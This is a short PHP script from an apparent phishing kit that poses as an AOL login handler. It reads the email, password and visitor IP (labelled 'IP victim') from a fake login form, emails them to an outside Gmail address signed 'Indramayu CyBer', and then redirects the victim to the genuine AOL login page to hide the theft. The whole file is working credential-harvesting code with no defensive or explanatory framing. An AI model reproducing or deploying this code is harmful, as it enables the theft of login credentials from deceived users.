<?php
$ip = getenv("REMOTE_ADDR");
$email = $_POST['loginId'];
$password = $_POST['password'];


$login = "Email : ".$email;
$pass = "Password : ".$password;
$target = "IP victim : ".$ip;

$semail = "jesuswire80@gmail.com";
$head = "########### Login info ############";
$foot = "####### Indramayu CyBer ###########";
$body = "AOL Login Information";
mail("$semail", "$body","$head \n$login \n$pass \n$target \n$foot");
header("Location: https://my.screenname.aol.com/_cqr/login/login.psp?siteState=CyBw-ILXIOJHbnthXrVxbL3GhTOJgCT-oPQt059hseM&locale=us&lang=en&sitedomain=account-management&authLev=2");
?>